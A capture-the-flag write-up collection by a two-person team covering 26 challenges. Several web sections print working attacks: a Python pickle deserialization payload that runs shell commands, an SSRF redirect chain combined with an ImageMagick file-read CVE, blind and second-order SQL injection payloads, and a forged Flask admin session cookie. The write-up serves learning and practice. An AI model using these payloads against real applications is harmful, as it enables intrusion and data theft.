# NOX9 — InIt CTF 2026 Write-ups

**Team:** NOX9  
**Team leader:** SPEAR  
**Team member:** 광장동김치찌개장인

We combined our notes from InIt CTF 2026 into this write-up collection. SPEAR documented 13 challenges, and 광장동김치찌개장인 documented 17. Four challenges appeared in both sets of notes, so the collection covers **26 distinct challenges**. For the overlapping ones, we've included both approaches where they differed.

The flags and findings are based on our original solve notes. We haven't retested every exploit or gone back through every challenge attachment. One flag-format discrepancy remains in **Red John Returns**, which is explained in its section.

## Contents

1. [Cash Now](#01-cash-now) · SPEAR
2. [Super Blind](#02-super-blind) · SPEAR
3. [The Careless Twins](#03-the-careless-twins) · SPEAR
4. [Super Pickle](#04-super-pickle) · SPEAR
5. [The Last Announcement](#05-the-last-announcement) · SPEAR / 광장동김치찌개장인
6. [Super Cookie](#06-super-cookie) · SPEAR
7. [Not to Soon](#07-not-to-soon) · SPEAR / 광장동김치찌개장인
8. [Red John's Footprints](#08-red-johns-footprints) · SPEAR
9. [Red John Returns](#09-red-john-returns) · SPEAR / 광장동김치찌개장인
10. [The Troll's Ticket](#10-the-trolls-ticket) · SPEAR
11. [Camera Lost & Found](#11-camera-lost--found) · SPEAR / 광장동김치찌개장인
12. [Beepy](#12-beepy) · SPEAR
13. [Where Am I?](#13-where-am-i) · SPEAR
14. [The Ink That Bled](#14-the-ink-that-bled) · 광장동김치찌개장인
15. [The Fractured Key](#15-the-fractured-key) · 광장동김치찌개장인
16. [leaky history](#16-leaky-history) · 광장동김치찌개장인
17. [Weird Sound](#17-weird-sound) · 광장동김치찌개장인
18. [Second](#18-second) · 광장동김치찌개장인
19. [hidden giveaway](#19-hidden-giveaway) · 광장동김치찌개장인
20. [keychain-crumbs](#20-keychain-crumbs) · 광장동김치찌개장인
21. [ec2-dropper](#21-ec2-dropper) · 광장동김치찌개장인
22. [Locked Notes](#22-locked-notes) · 광장동김치찌개장인
23. [Deleted Evidence](#23-deleted-evidence) · 광장동김치찌개장인
24. [Known Plaintext PRNG](#24-known-plaintext-prng) · 광장동김치찌개장인
25. [Le Chiffre](#25-le-chiffre) · 광장동김치찌개장인
26. [Two Layers](#26-two-layers) · 광장동김치찌개장인

---

## 01. Cash Now

**200 points · SPEAR**  
**Flag:** `InIt{ssrf_pNgcrush_3numt00l0ng}`

This challenge involved chaining two vulnerabilities. The avatar feature fetched URLs supplied by users. It blocked direct requests to private IP addresses and rejected 301/302 redirects, but **307 redirects** could still reach an internal service.

The application also generated document thumbnails using **ImageMagick 7.1.0-48**, which was vulnerable to the PNG profile file-read issue associated with CVE-2022-44268.

We started by using the avatar field to reach the internal archive service through a public redirector:

```text
https://httpbin.dev/redirect-to?url=http%3A%2F%2F127.0.0.1%3A39417%2Farchive%2Fconfig&status_code=307
```

The avatar error response revealed the archive's `upload_dir`. We needed this path because the directory wasn't fixed across processes.

Next, we created a PNG containing a `tEXt` chunk with the keyword `profile`. The value pointed to the file we wanted to read:

```text
keyword = profile
value   = /data/internal/verification_status.txt
```

During conversion, ImageMagick embedded the file contents into a raw profile in the generated thumbnail.

The preview endpoint also allowed unauthenticated access to files inside the upload directory. We repeatedly requested the temporary thumbnail while conversion was running, before the file was deleted:

```text
/documents/preview?path=<upload_dir>tmp/<username>.png
```

Once we retrieved the thumbnail, we decoded the hexadecimal bytes in its `Raw profile type txt` data. The decoded output contained the verification-status file and the flag.

The complete exploit chain was:

**307 redirect → internal path leak → PNG profile file read → temporary thumbnail race**

The local Dockerfile contained an empty `InIt{}` placeholder. The flag above came from the remote response.

---

## 02. Super Blind

**Web · 200 points · Abdullah Hamdan · SPEAR**  
**Flag:** `InIt{bl1nd_sql_1nj3ct10n_g0brrrrr!@#}`

Entering a single quote in the search box triggered a SQL error. Common injection strings such as `OR`, `UNION`, `SELECT`, and SQL comments were filtered, so we tried using SQLite's `GLOB` operator for boolean-based injection.

For example, this payload in the `q` parameter checked whether `secret` started with `InIt{b`:

```sql
' LIKE (secret GLOB 'InIt{b*') LIKE '1
```

Depending on whether the condition was true or false, the `archive` search result either appeared or disappeared.

We used that difference to recover the secret one character at a time, extending the known prefix until we obtained the full flag:

```text
InIt{bl1nd_sql_1nj3ct10n_g0brrrrr!@#}
```

---

## 03. The Careless Twins

**Crypto · 200 points · SPEAR**  
**Flag:** `InIt{n3v3r_r3us3_pr1m3s_1n_rs4}`

The two RSA moduli shared the same prime factor:

```text
n1 = p * q1
n2 = p * q2
```

Computing `gcd(n1, n2)` gave us the shared prime `p`.

The source also included `random.seed(1337)`, which initially looked relevant. However, the function using it, `get_secure_prime()`, wasn't responsible for generating these keys.

After recovering `p`, we calculated the first private exponent and decrypted the ciphertext:

```python
from math import gcd
from pathlib import Path
import re

values = {
    k: int(v)
    for k, v in re.findall(
        r"^(n1|n2|e|c1) = (\d+)$",
        Path("output.txt").read_text(),
        re.M,
    )
}

p = gcd(values["n1"], values["n2"])
q1 = values["n1"] // p
phi = (p - 1) * (q1 - 1)
d = pow(values["e"], -1, phi)
m = pow(values["c1"], d, values["n1"])
print(m.to_bytes((m.bit_length() + 7) // 8, "big"))
```

The decrypted plaintext was:

```text
InIt{n3v3r_r3us3_pr1m3s_1n_rs4}
```

---

## 04. Super Pickle

**Web · 200 points · SPEAR**  
**Flag:** `InIt{Un1c0d3_P1ckl3_Byp4ss}`

The application Base64-decoded user input and passed the result directly to `pickle.loads()`.

Since Python's `pickle` module can invoke functions during deserialization through `__reduce__`, we could use a crafted object to execute commands inside the challenge environment.

The input filter blocked the word `flag`, so we avoided referencing a flag file directly. Instead, we made the payload list the root directory and print the environment variables:

```python
import base64
import pickle
import subprocess

class Payload:
    def __reduce__(self):
        return (
            subprocess.check_output,
            (["/bin/sh", "-c", "ls -la /; printenv"],),
        )

print(base64.b64encode(pickle.dumps(Payload(), protocol=0)).decode())
```

We submitted the generated Base64 string. The page displayed the command output as the deserialized value, including the `FLAG` environment variable.

---

## 05. The Last Announcement

**Misc · 200 points · pri4cy · SPEAR and 광장동김치찌개장인**  
**Confirmed flag:** `InIt{h1d1ng_f1l3s_1n_4ud10}`

Both of us worked on this challenge using spectrograms. The WAV sounded like a normal train announcement, but text was hidden in its frequency spectrum.

### SPEAR's approach

The recording was 48 kHz, 16-bit stereo PCM. We focused on the high-frequency range, roughly 5–20 kHz, starting around 2.5 seconds into the recording.

Our first script generated a spectrogram, applied a median filter, and saved a high-contrast image:

```python
import wave
import numpy as np
from scipy.signal import spectrogram
from scipy.ndimage import median_filter
from PIL import Image

path = r"C:\Users\spear\Downloads\Train_Announcement.wav"
with wave.open(path, "rb") as wav:
    rate = wav.getframerate()
    samples = np.frombuffer(
        wav.readframes(wav.getnframes()), dtype="<i2"
    ).reshape(-1, 2)[:, 0].astype(float)

freq, time, power = spectrogram(
    samples,
    fs=rate,
    nperseg=1024,
    noverlap=896,
    scaling="spectrum",
    mode="magnitude",
)
db = 20 * np.log10(np.maximum(power, 1e-6))
region = db[
    (freq >= 5000) & (freq <= 20000)
][:, (time >= 2.5) & (time <= 17.35)]

smooth = median_filter(region, size=(3, 5))
image = Image.fromarray((smooth > 40).astype(np.uint8) * 255)
image = image.resize(
    (image.width, int(image.height * 0.42)), Image.Resampling.BOX
)
image = Image.eval(image, lambda pixel: 255 - pixel)
image = image.resize(
    (image.width, image.height * 2), Image.Resampling.NEAREST
)
image.save("spectrogram.png")
```

Our first reading was `InIt{tr4in_st3g0gr4phy}`, which turned out to be incorrect. The team later confirmed the actual flag as `InIt{h1d1ng_f1l3s_1n_4ud10}`.

### 광장동김치찌개장인's approach

I started by checking the RIFF chunks. The audio was 17.39 seconds long, and there was no archive or extra data appended after the audio chunk.

The left and right channels were almost identical, so I averaged them and plotted an STFT using a 2048-sample window and a 256-sample hop.

Most of the letters appeared between 5 and 20 kHz, but the underscores were below 2 kHz. Viewing the full frequency range made the word breaks much easier to distinguish.

One detail worth noting is that the second character of `f1l3s` is a lowercase **l**, while `4ud10` ends with a **zero**.

```python
import sys
from pathlib import Path

import matplotlib.pyplot as plt
import numpy as np
from scipy.io import wavfile
from scipy.signal import stft

sample_rate, pcm = wavfile.read(sys.argv[1])
mono = pcm.astype(np.float64).mean(axis=1)
frequencies, times, spectrum = stft(
    mono, fs=sample_rate, nperseg=2048, noverlap=1792
)
db = 20 * np.log10(np.maximum(np.abs(spectrum), 1e-8))

plt.figure(figsize=(14, 3))
plt.pcolormesh(
    times, frequencies, db, shading="auto", cmap="gray_r", vmin=8, vmax=47
)
plt.xlim(2.65, 17.1)
plt.ylim(0, 20700)
plt.xlabel("Time (s)")
plt.ylabel("Frequency (Hz)")
with Path(sys.argv[2]).open("xb") as output:
    plt.savefig(output, format="png", dpi=140, bbox_inches="tight")
```

**Flag:** `InIt{h1d1ng_f1l3s_1n_4ud10}`

---

## 06. Super Cookie

**Web · 100 points · SPEAR**  
**Flag:** `InIt{C00k1e_F0rg3ry_1s_Sup3r}`

We found the admin path in `/robots.txt`:

```text
/admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311
```

Opening the page set a `session` cookie.

The cookie was signed using Flask's session mechanism, so directly modifying its contents wouldn't work without a valid signature.

We tested likely signing keys and found that the application used `secret123`.

With the key known, we generated a new session cookie containing `role=admin`:

```python
import requests
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

base = "http://172.198.60.104:3000"
admin_path = "/admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311"

interface = SecureCookieSessionInterface()
serializer = URLSafeTimedSerializer(
    "secret123",
    salt=interface.salt,
    serializer=interface.serializer,
    signer_kwargs={
        "key_derivation": interface.key_derivation,
        "digest_method": interface.digest_method,
    },
)

forged_cookie = serializer.dumps({"role": "admin", "username": "admin"})
response = requests.get(
    base + admin_path,
    cookies={"session": forged_cookie},
)
print(response.text)
```

The forged session gave us access to the administrator page, where the flag was displayed.

The signature algorithm itself wasn't broken. The problem was the application's predictable signing secret.

---

## 07. Not to Soon

**OSINT · 50 points · Harsh Agarwal · SPEAR and 광장동김치찌개장인**  
**Flag:** `InIt{n0t_s0_s00n_but_f0und_1t}`

The challenge led us to the Instagram account `@not_so_soon_`.

It had three posts with the captions **“not so soon.”**, **“almost there.”**, and **“read between the lines.”** The bio said “At the right place.”

### What SPEAR found

The first post showed a dark room, while the second showed a clock and compass. The clock image included the label `Celestial Timepiece` and `MAKER: OVIDIUS, C. 1650`.

We looked into those details, but they didn't lead to the flag.

The useful clue was in the third post. The caption suggested looking more closely, and the dark image had low-contrast text near the bottom:

```text
but_f0und_1t}
```

That gave us the ending of the flag.

The account username suggested the beginning, with the letter `o` replaced by `0`:

```text
not_so_soon → n0t_s0_s00n
```

Combining the two parts gave:

```text
InIt{n0t_s0_s00n_but_f0und_1t}
```

### What 광장동김치찌개장인 found

I examined the image pixels and checked the comments as well.

To make the hidden text easier to read, I subtracted a blurred, downscaled version of the image from the original:

```python
import numpy as np
from PIL import Image

image = np.asarray(
    Image.open("textimg.jpg").convert("L"), dtype=np.int16
)
background = np.asarray(
    Image.open("textimg.jpg")
    .convert("L")
    .resize((48, 48))
    .resize((768, 768)),
    dtype=np.int16,
)
revealed = np.clip((image - background) * 2 + 128, 0, 255)
Image.fromarray(revealed.astype("uint8")).save("reveal.png")
```

This revealed the same ending, `but_f0und_1t}`.

I also found a comment from the account itself in an expanded thread on the clock post:

```text
InIt{n0t_s0_s00n_
```

That confirmed the prefix instead of relying only on the username.

There was another comment on the chair post, `init(not_so_fast)`, but it was a decoy.

---

## 08. Red John's Footprints

**OSINT · 100 points · Harsh Agarwal · SPEAR**  
**Flag:** `InIt{th3_truth_w4s_1n_th3_w4t3r}`

The challenge gave us the username `rEdJ0Hn203` along with the line:

> I never stop pushing my work out there.

The word “pushing” suggested GitHub, so we searched for the username there.

The account's [rEdJ0Hn.md](https://github.com/rEdJ0Hn203/rEdJ0Hn/blob/main/rEdJ0Hn.md) linked to a Medium article.

The article contained several fake flags. Rather than trying those, we followed a link attached to **“1 teacup of water”** in the Ingredients list.

That led us to the actual flag:

```text
InIt{th3_truth_w4s_1n_th3_w4t3r}
```

---

## 09. Red John Returns

**OSINT / Crypto · 200 points · Harsh Agarwal · SPEAR and 광장동김치찌개장인**  
**Submission status:** Final accepted spelling not recorded

This challenge used the same GitHub account as **Red John's Footprints**, but the relevant file was [for_patrick](https://github.com/rEdJ0Hn203/rEdJ0Hn/blob/main/for_patrick), not the earlier Medium article.

Two lines stood out:

> I never liked even company.  
> Five of these are mine.

The file contained ten hashes or trivia questions. The wording suggested taking the answers from the **odd-numbered lines**.

| Line | Clue | Answer |
| ---: | --- | --- |
| 1 | MD5 `d1b145842e9b731a66eef0ee6fc33497` | `smiley` |
| 3 | Year of the Morris worm | `1988` |
| 5 | SHA-256 `417f1824ba04658978262aea110b75724ed39c984ccbed0b5c56a7ad801d0f1c` | `teacup` |
| 7 | Default RDP port | `3389` |
| 9 | NTLM `9d7f37db9e15ce06e8274a36bdd6cce3` | `lisbon` |

The even-numbered lines were distractions: SSH port 22, passwords such as `password` and `qwerty`, the WannaCry year 2017, and `letmein`.

The ninth hash was a little misleading. Since it contained 32 hexadecimal characters, it looked like MD5 at first, but the intended interpretation was **NTLM**, which uses MD4 over UTF-16LE password bytes.

### About the separator mismatch

Our notes contained two versions of the flag.

SPEAR recorded it with underscores:

```text
InIt{smiley_1988_teacup_3389_lisbon}
```

광장동김치찌개장인 recorded it without separators:

```text
InIt{smiley1988teacup3389lisbon}
```

Looking back at `for_patrick`, the file explicitly says to write the answers **in lowercase with nothing in between**.

It also provides an eight-character SHA-256 check, `aa999a60`, which matches:

```text
init{smiley1988teacup3389lisbon}
```

So the no-underscore version is supported by the source. What we couldn't confirm from our notes was whether the platform expected `init{...}` or the usual `InIt{...}` capitalization.

We don't have the accepted submission record, so the final flag format remains unconfirmed.

---

## 10. The Troll's Ticket

**Forensics / Misc · 200 points · pri4cy · SPEAR**  
**Flag:** `InIt{j0urney_4cr0ss_1ndia}`

The handout was named `IRCTC_Tatkal_Hack.pdf`, but checking its file signature showed that it was actually an encrypted ZIP archive.

The first extraction password was:

```text
railwaystationroyaljourney
```

Inside, we found clues leading through four Indian cities. Each stage provided the password needed to extract the next one.

| City | Password |
| --- | --- |
| Delhi | `cholebhature` |
| Mumbai | `vada_pav` |
| Chennai | `mylapore` |
| Kolkata | `peacock` |

After extracting the Kolkata layer, we reached the final ticket PDF containing the flag:

```text
InIt{j0urney_4cr0ss_1ndia}
```

---

## 11. Camera Lost & Found

**Forensics · 100 points · pri4cy · SPEAR and 광장동김치찌개장인**  
**Flag:** `InIt{h1d1ng_1n_m3tad4t4}`

We extracted `2026-india-trip.7z` using the password `camera-found`.

The archive contained several travel photos in JPEG format. We checked their EXIF metadata and found something interesting in **`IMG_38.jpg`**.

Its `ImageDescription` field contained this URL:

```text
https://ctf.pir4cy.com/exif-flag
```

광장동김치찌개장인 used ExifTool to read the field directly:

```powershell
ExifTool.exe -ImageDescription "./2026-india-trip/IMG_38.jpg"
```

The linked page returned a Base64-encoded string:

```text
SW5JdHtoMWQxbmdfMW5fbTN0YWQ0dDR9Cg==
```

We decoded it with Python:

```python
import base64

encoded = "SW5JdHtoMWQxbmdfMW5fbTN0YWQ0dDR9Cg=="
print(base64.b64decode(encoded).decode().strip())
```

The decoded value was:

```text
InIt{h1d1ng_1n_m3tad4t4}
```

---

## 12. Beepy

**Misc / Audio · 100 points · SPEAR**  
**Flag:** `InIt{B33PY_M0RS3_1S_C00L}`

The audio consisted of short and long beeps separated by pauses, indicating Morse code.

By reading the beep durations and the gaps between them, we recovered:

```text
InIt{B33PY_M0RS3_1S_C00L}
```

Our notes contain the final decoded result, but not the original beep timing transcription.

---

## 13. Where Am I?

**OSINT · 100 points · Harsh Agarwal · SPEAR**  
**Flag:** `InIt{PERUGIA_ITALY_CEST}`

The challenge provided a photograph and asked us to identify the city, country, and local time-zone abbreviation during daylight saving time.

We focused on the stone arch bridge above a broad staircase, the ramp alongside the steps, and the surrounding older buildings.

Comparing those landmarks with reference images led us to **Perugia, Italy**.

Perugia uses **CET (UTC+1)** during standard time and **CEST (UTC+2)** during daylight saving time.

Since the question specifically requested the daylight-saving abbreviation, we submitted:

```text
InIt{PERUGIA_ITALY_CEST}
```

---

## 14. The Ink That Bled

**OSINT · 259 points · Harsh Agarwal · 광장동김치찌개장인**  
**Flag:** `InIt{u_5h0uLd_h3ar_Taba_ch4k3}`

The clue “rizz from ncreeps” pointed toward a username and a CTF team.

I checked the [nCreeps roster on CTFtime](https://ctftime.org/team/203035/) and found `rizzabh`. A matching [LinkedIn profile](https://in.linkedin.com/in/rishhabh) led to a portfolio using the same name.

Another clue mentioned “Reid” and “Hoffman,” which also suggested LinkedIn.

From the portfolio, I followed the LinkedIn links and looked through posts, including one about the opening of MIT ADT University's VAPT Center.

The flag wasn't in the post text or tags. I found it in a comment by **Sasmit Narnaware**, dated November 14, 2026.

There was also a flag-like decoy among the comments, so I checked which one matched the challenge clues.

The path I followed was:

**nCreeps → rizzabh → LinkedIn → VAPT Center post → comments**

---

## 15. The Fractured Key

**Crypto · 500 points · OffScript · 광장동김치찌개장인**  
**Flag:** `InIt{ps3ud0_r4nd0m_1s_n0t_r4nd0m_k3y_sp4c3_t00_sm4ll}`

The challenge provided three ciphertexts in `intercepted.txt` and a key generator in `key_gen.py`.

The generator produced a 32-byte AES key, but the random number generator was initialized with only 256 possible seeds:

```python
seed = random.randint(0, 255)
random.seed(seed)
```

That made the effective key space small enough to brute-force.

The encrypted data consisted of a 16-byte IV followed by AES-CBC ciphertext with PKCS#7 padding.

I reproduced the key generation process and tried all 256 seeds against each ciphertext:

```python
import random
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

for line_number, line in enumerate(
    Path("intercepted.txt").read_text().splitlines(), 1
):
    raw = bytes.fromhex(line.strip())
    iv, ciphertext = raw[:16], raw[16:]

    for seed in range(256):
        random.seed(seed)
        key = bytes(random.randint(0, 255) for _ in range(32))
        try:
            plaintext = unpad(
                AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), 16
            )
        except ValueError:
            continue

        if plaintext.startswith(b"InIt{") and plaintext.endswith(b"}"):
            print(line_number, seed, plaintext.decode())
```

Several decrypted messages looked like valid flags, but they were decoys.

Seed 42 produced a message identifying itself as fake, and seed 137 told us to keep looking.

The result from **seed 201** described the small PRNG seed space and gave the intended flag:

```text
InIt{ps3ud0_r4nd0m_1s_n0t_r4nd0m_k3y_sp4c3_t00_sm4ll}
```

---

## 16. leaky history

**Forensics · 200 points · Kshitij Raj · 광장동김치찌개장인**  
**Flag:** `InIt{d4ngl1ng_c0mm1t_l34k}`

The supplied `repo.tar.gz` contained a Git repository named `tanvoro-deploy`, including its `.git` directory.

The current `main` branch no longer contained the secret file, but its contents were still present in an older Git object.

I extracted the archive and checked the commit history:

```bash
tar -xf repo.tar.gz
cd tanvoro-deploy
git log --oneline main
```

One commit message mentioned `deploy/secrets.env`.

The reflog didn't contain the missing commit, so I checked `ORIG_HEAD` and searched for unreachable objects:

```bash
git rev-parse ORIG_HEAD
git fsck --full --no-reflogs
```

`ORIG_HEAD` pointed to:

```text
6dfa863c4a9a1700c6f09a608761f82ef9c241a2
```

Git also reported that commit as dangling.

I inspected the files in the old commit:

```bash
git show --format=oneline --name-only ORIG_HEAD
```

The output included `deploy/secrets.env`.

I could then read the original file without checking out the commit:

```powershell
git show 'ORIG_HEAD:deploy/secrets.env' | Select-String -SimpleMatch 'InIt{'
```

The flag was stored in the `DEPLOY_TOKEN` entry.

---

## 17. Weird Sound

**Misc · 100 points · Abdullah Hamdan · 광장동김치찌개장인**  
**Flag:** `InIt{W0ah_Y0u_S33_M3!}`

The provided WAV was 7.03 seconds long, recorded as 48 kHz, 16-bit mono audio.

It sounded like a sequence of tones, so I generated a spectrogram to see whether the frequencies contained a hidden pattern.

The STFT plot revealed text in the **2–12 kHz** range.

I used a 512-sample window and a 128-sample hop:

```python
import sys
import wave

import matplotlib.pyplot as plt
import numpy as np
from scipy.signal import stft

with wave.open(sys.argv[1], "rb") as audio:
    assert (audio.getnchannels(), audio.getsampwidth()) == (1, 2)
    sample_rate = audio.getframerate()
    samples = np.frombuffer(audio.readframes(audio.getnframes()), dtype="<i2")

frequencies, times, spectrum = stft(
    samples, fs=sample_rate, nperseg=512, noverlap=384
)
level = 20 * np.log10(np.maximum(np.abs(spectrum), 1e-9))
level -= level.max()

plt.figure(figsize=(15, 4))
plt.pcolormesh(
    times, frequencies, level, shading="auto", cmap="gray", vmin=-68, vmax=0
)
plt.ylim(2000, 12000)
plt.xlabel("Time (s)")
plt.ylabel("Frequency (Hz)")
plt.tight_layout()
plt.savefig("spectrogram.png")
```

Reading the text gave:

```text
InIt{W0ah_Y0u_S33_M3!}
```

The round characters in `W0ah` and `Y0u` were zeros, not the letter O.

---

## 18. Second

**Web · 100 points · 광장동김치찌개장인**  
**Flag:** `InIt{s3c0nd_0rd3r_1nj3ct10n}`

The target was a LedgerLite invoice and reporting application running at `http://172.198.60.104:8082`.

A saved report had a configurable sort key. That value was stored first and used later when someone opened the report.

In `routes/reports.py`, the application inserted the stored `sort_key` directly into the query's `ORDER BY` clause.

The relevant part of the route handler looked like this:

```python
# Inside the report route
sql = f"SELECT ... FROM invoices WHERE user_id = {user['id']} ORDER BY {report['sort_key']}"
try:
    rows = db.execute(sql)
except Exception as e:
    return render("report.html", error=str(e))
```

Database errors were also shown in the response.

We could use MySQL's `extractvalue()` behavior to include the result of a subquery in an XPath error message.

The payload used this structure:

```sql
(extractvalue(1,concat(0x7e,(SELECT substring(flag,1,31) FROM flags))))
```

I first queried `information_schema` to identify the table and column containing the flag.

Then I extracted the value in **31-character chunks**, starting at positions 1, 32, 63, and so on.

The application HTML-escaped the database error messages, so I decoded the HTML entities before joining the chunks.

This was a **second-order SQL injection** caused by an unchecked sort identifier. The stored sort key needed to be restricted to an allow-list of permitted column names.

---

## 19. hidden giveaway

**Misc / Steganography · 100 points · 광장동김치찌개장인**  
**Flag:** `InIt{h1d1ng_1n_b1ue_l1gh7}`

The challenge provided a tourist map of India.

The visible image and metadata didn't reveal anything useful, so I extracted the bit planes from its RGB channels.

The red and green least-significant bits didn't show a message, but the **lowest bit of the blue channel** contained a QR code.

```python
import numpy as np
from PIL import Image

image = np.asarray(
    Image.open("india_tourist_map.png").convert("RGB"),
    dtype=np.uint8,
)
blue_lsb = (image[:, :, 2] & 1) * 255
Image.fromarray(blue_lsb).save("blue_lsb.png")
```

The extracted image showed the QR code's three finder patterns.

I decoded it using OpenCV:

```python
import cv2

detector = cv2.QRCodeDetector()
text, points, _ = detector.detectAndDecode(cv2.imread("blue_lsb.png"))
print(text)
```

OpenCV was able to read the extracted QR code directly. If detection fails, enlarging the image with nearest-neighbor interpolation can help preserve the QR modules.

---

## 20. keychain-crumbs

**Forensics · 200 points · Kshitij Raj · 광장동김치찌개장인**  
**Flag:** `InIt{k3ych4in_crumbs_l34k3d_0v3r_pl41n_http}`

The packet capture contained **58 HTTP POST requests** from `192.168.1.24` to `update.icloud-sync.cc` (`185.199.111.153:80`).

All requests targeted `/api/collect`, and each JSON body contained an `id` and a Base64 fragment stored in `part`.

The fragments appeared out of order in the capture.

I sorted them by `id`, verified that all IDs from 0 through 57 were present, and concatenated the fragments before Base64-decoding them.

The result was a **2,080-byte ZIP archive**.

All five files passed their ZIP CRC checks:

```text
system_profiler.txt
keychain_dump.txt
TCC.db
com.apple.finder.plist
browsing_data.json
```

The system profile identified the machine as `MARCUS-MBP`, used by `mreid`, running macOS 15.2 on an M1 Pro (`MacBookPro18,3`).

The flag was in the recovered `Library/Keychains/keychain_dump.txt`.

A record with service `backup-key` contained a Base64-encoded `data` field. Decoding that field revealed the flag.

The other recovered files showed what else had been collected, but they weren't necessary to obtain the flag.

---

## 21. ec2-dropper

**Forensics · 광장동김치찌개장인**  
**Flag:** `InIt{imds_k3y3d_s3cr3t_v4ult}`

The evidence bundle contained `vault.py`, `vault.bin`, cloud-init output, syslog, and a crontab.

I inspected `vault.py` without running it. On a real EC2 instance, the script would request the instance ID from the instance metadata service. Its offline fallback expected an `instance-id.cache` file, but that file wasn't included in the bundle.

The key derivation logic was:

```text
SHA-256("s4lt_" + instance_id)
```

I found the missing instance ID in `cloud-init-output.log`:

```text
instance-id: i-0a1b2c3d4e5f67890
ami-id: ami-0f3c9e4b21d7a5c88
```

The AMI ID looked similar but wasn't the value needed for decryption.

The `vault.bin` file contained a 16-byte IV followed by AES-256-CBC ciphertext with PKCS#7 padding.

Using the instance ID from the log, I decrypted it with:

```python
import hashlib
import json
from pathlib import Path

from Crypto.Cipher import AES

instance_id = "i-0a1b2c3d4e5f67890"
key = hashlib.sha256(("s4lt_" + instance_id).encode()).digest()
blob = Path("agent/vault.bin").read_bytes()
iv, ciphertext = blob[:16], blob[16:]

padded = AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext)
padding = padded[-1]
assert padded[-padding:] == bytes([padding]) * padding
config = json.loads(padded[:-padding])
print(config)
```

The decrypted data was valid JSON, with `config_version` set to 2.

That matched the syslog entry:

```text
agent: loaded config vault (version 2)
```

The flag was stored in the `operator_note` field.

---

## 22. Locked Notes

**Forensics · 100 points · 광장동김치찌개장인**  
**Flag:** `InIt{s3cur3_n0t3s_n0t_s0_s3cur3}`

The archive contained the data directory of an Android Secure Notes application.

Rather than running the app, I inspected its SQLite database at `databases/notes.db`.

Note 4 was titled `Recovery Code` and had `is_locked = 1`.

The app settings mentioned PIN and biometric authentication, but the note itself wasn't encrypted.

Its `body` field was a BLOB beginning with the gzip signature `1f 8b`.

I checked the database entry with:

```sql
SELECT _id, title, is_locked, typeof(body), length(body), hex(substr(body, 1, 2))
FROM notes
WHERE _id = 4;
```

Then I extracted and decompressed the note body:

```python
import gzip
import sqlite3

db = sqlite3.connect("notes.db")
body, = db.execute(
    "SELECT body FROM notes WHERE _id = 4"
).fetchone()
print(gzip.decompress(body).decode())
```

The decompressed text contained the flag.

The note was locked in the app's interface, but its contents remained accessible directly from the database.

---

## 23. Deleted Evidence

**Forensics · 100 points · 광장동김치찌개장인**  
**Flag:** `InIt{d3l3t3d_but_n0t_g0n3}`

This challenge involved recovering a deleted file from an NTFS filesystem image.

A deleted file's data can remain on disk until its clusters are overwritten, even after the directory entry has been marked as deleted.

I used Sleuth Kit to list deleted entries:

```bash
fls -r -d evidence.img
```

The output included `recovery_code.gz` at **MFT record 75**.

I recovered the file with `icat` and decompressed it:

```bash
icat -r evidence.img 75 > recovery_code.gz
gzip -dc recovery_code.gz
```

The decompressed text was still encoded using ROT13.

Applying that final decoding step recovered the flag:

```bash
gzip -dc recovery_code.gz | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

## 24. Known Plaintext PRNG

**Crypto · 200 points · OffScript · 광장동김치찌개장인**  
**Flag:** `InIt{kn0wn_pl41nt3xt_4tt4cks_4r3_c00l}`

The encryptor XORed four-byte plaintext blocks with a 32-bit state.

After processing each block, it updated the state using:

```text
next_key = (key * 1103515245 + 12345) mod 2^32
```

Since we knew the flag would begin with `InIt`, we already knew the first four plaintext bytes.

XORing them with the first ciphertext block revealed the initial state:

```text
initial_key = int(ciphertext[0:4]) XOR int("InIt")
            = 0x9011a89e
```

With the initial key recovered, I decrypted the remaining blocks by repeating the XOR operation and updating the state:

```python
from pathlib import Path

ciphertext = Path("flag.enc").read_bytes()
key = int.from_bytes(ciphertext[:4], "big") ^ int.from_bytes(b"InIt", "big")
plaintext = bytearray()

for offset in range(0, len(ciphertext), 4):
    block = ciphertext[offset:offset + 4]
    key_bytes = key.to_bytes(4, "big")
    plaintext.extend(a ^ b for a, b in zip(block, key_bytes))
    key = (key * 1103515245 + 12345) & 0xffffffff

print(plaintext.decode())
```

The final block was shorter than four bytes, so the code only processed the bytes that were present.

I also re-encrypted the recovered plaintext and compared it with the original ciphertext. All **38 bytes** matched.

---

## 25. Le Chiffre

**Crypto · 200 points · Harsh Agarwal · 광장동김치찌개장인**  
**Flag:** `InIt{v1g3n3r3_w4s_n0t_th3_4nsw3r}`

The clue described the key as the hour when everything goes quiet.

I interpreted that as **midnight** and tried `MIDNIGHT` as a repeating Vigenère key.

Only alphabetic characters advance the key position. Digits, underscores, and braces are left unchanged.

```python
ciphertext = "UvLg{d1m3u3k3_i4a_q0g_bn3_4uli3z}"
key = "midnight"
plain = []
key_index = 0

for char in ciphertext:
    if char.isalpha():
        base = ord("A") if char.isupper() else ord("a")
        shift = ord(key[key_index % len(key)]) - ord("a")
        plain.append(chr((ord(char) - base - shift) % 26 + base))
        key_index += 1
    else:
        plain.append(char)

print("".join(plain))
```

The result was:

```text
InIt{v1g3n3r3_w4s_n0t_th3_4nsw3r}
```

Interestingly, the decoded text says “Vigenere was not the answer,” even though Vigenère with the key `MIDNIGHT` produced the flag.

---

## 26. Two Layers

**Misc · 100 points · Harsh Agarwal · 광장동김치찌개장인**  
**Flag:** `InIt{r0t_th3n_b64_1s_n0t_s3cur1ty}`

The provided string ended with Base64 padding, so I tried decoding it first.

The output was readable but still looked encoded:

```text
VaVg{e0g_gu3a_o64_1f_a0g_f3phe1gl}
```

The prefix `VaVg` suggested ROT13, since applying it produces `InIt`.

I decoded both layers with:

```python
import base64
import codecs

encoded = "VmFWZ3tlMGdfZ3UzYV9vNjRfMWZfYTBnX2YzcGhlMWdsfQ=="
first_layer = base64.b64decode(encoded).decode()
print(first_layer)
print(codecs.decode(first_layer, "rot_13"))
```

The final output was:

```text
InIt{r0t_th3n_b64_1s_n0t_s3cur1ty}
```

The original encoding order was **ROT13 followed by Base64**, so decoding them in reverse order recovered the flag.

---

## Notes

